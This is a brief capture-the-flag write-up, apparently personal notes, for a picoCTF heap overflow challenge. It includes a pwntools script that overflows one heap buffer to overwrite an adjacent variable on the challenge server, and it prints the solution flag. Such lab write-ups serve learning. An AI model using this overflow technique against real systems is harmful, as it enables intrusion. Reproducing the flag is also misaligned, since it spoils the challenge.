---
created: 2024-08-08T00:20
updated: 2024-08-08T01:08
---

Since two `malloc` are fired in succession, their memory addresses are likely to be right next to each other.

| Variable     | Address          | Data   |
| ------------ | ---------------- | ------ |
| `input_data` | `0x59a3f74dc2b0` | `pico` |
| `safe_var`   | `0x59a3f74dc2d0` | `bico` |

The addresses themselves however could be separated by the block size.
IIRC `malloc` do this to make memory access more efficient.

We can hence overflow `input_data` with 32 characters.

```python
from pwn import *
# nc tethys.picoctf.net 55998
t = remote('tethys.picoctf.net', 55998)
t.sendlineafter(b": ", b"2")
t.sendlineafter(b": ", b"A"*32+b"pico")
t.sendlineafter(b": ", b"4")
info(t.recvall())
```

```flag
picoCTF{starting_to_get_the_hang_79ee3270}
```
